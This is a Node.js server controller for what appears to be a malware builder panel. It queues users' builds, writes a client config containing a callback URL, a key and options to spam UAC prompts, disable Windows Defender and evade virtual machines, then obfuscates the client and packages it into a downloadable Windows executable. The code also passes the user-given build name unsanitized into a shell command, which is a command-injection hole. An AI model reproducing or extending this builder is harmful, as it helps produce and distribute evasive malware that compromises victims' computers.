const database = require('../../database/database');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const config = require('../../config');
const obfuscator = require('../obfuscator');
const childprocess = require('child_process');
const path = require('path');
const fs = require('fs');

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

class BuildQueue {
    constructor() {
        this.queue = [];
    }

    add(build) {
        this.queue.push(build);
    }

    aldready(username) {
        for (let i = 0; i < this.queue.length; i++) {
            const build = this.queue[i];

            if (build.username == username) {
                return true;
            }
        }
        return false;
    }

    length() {
        return this.queue.length;
    }

    async runQueue() {
        while (true) {
            await sleep(5000);
            if (this.queue.length == 0) {
                continue
            }

            const build = this.queue[0];
            const user = await database.getUser(build.id);
            let clientConfig = `{
                baseurl: "${config.baseurl + 'api'}",
                id: "${build.id}",
                encryptedKey: "${user.encryptedKey}",
                uacSpam: ${build.uacspam},
                disableDefender: ${build.wdefender},
                antivm: ${build.antivm}
            }`;
            
            fs.writeFileSync(path.join(process.cwd(), 'client', 'config.js'), "module.exports = " + clientConfig);
            await obfuscator.obfuscate();

            await exec(`pkg -C GZip -o ${build.name}.exe .`, { cwd: path.join(process.cwd(), 'client') });
            fs.renameSync(path.join(process.cwd(), 'client', `${build.name}.exe`), path.join(process.cwd(), 'panel', 'public', 'builds', `${build.name}.exe`) );
            
            await obfuscator.desobfuscate();
            database.addBuild(build.username, "success", `/builds/${build.name}.exe`);

            this.queue.shift();
        }
    }
}

const buildQueue = new BuildQueue();
buildQueue.runQueue();

exports.buildsGet = async (req, res) => {
    if (typeof req.session.username == 'undefined') {
        return res.redirect('/panel/login');
    }

    const builds = await database.getBuilds(req.session.username);

    return res.render('builds', {
        builds: builds,
        username: req.session.username
    });
};

exports.buildsPost = async (req, res) => {
    if (typeof req.session.username == 'undefined') {
        return res.redirect('/panel/login');
    }

    const builds = await database.getBuilds(req.session.username);

    const name = req.body.name,
        antivm = typeof req.body.antivm != "undefined" && req.body.antivm == 'on',
        wdefender = typeof req.body.antivm != "undefined" && req.body.antivm == 'on',
        uacspam = typeof req.body.antivm != "undefined" && req.body.antivm == 'on';

    if (typeof name == 'undefined' || name == '') {
        return res.render('builds', {
            error: "Some fields are empty / undefined."
        });
    }

    if (buildQueue.aldready(req.session.username)) {
        return res.render('builds', {
            error: "You already have a build in progress."
        });
    }

    buildQueue.add({
        username: req.session.username,
        id: req.session.userid,
        name: name,
        antivm: antivm,
        uacspam: uacspam,
        wdefender: wdefender
    });

    return res.render('builds', {
        builds: builds,
        info: `Your build has been added to the queue. ETA (${buildQueue.length()} min). Use menu to refresh.`,
        username: req.session.username
    });
};

exports.buildDelete = async (req, res) => {
    if (typeof req.session.username == 'undefined') {
        return res.redirect('/panel/login');
    }

    const id = req.query.id;

    if (typeof id == 'undefined' || id == '') {
        return res.redirect('/panel/builds');
    }

    const build = await database.getBuild(req.session.username, id);
    fs.rmSync(path.join(process.cwd(), 'panel', 'public', build.path));

    await database.deleteBuild(id, req.session.username);

    return res.redirect('/panel/builds');
}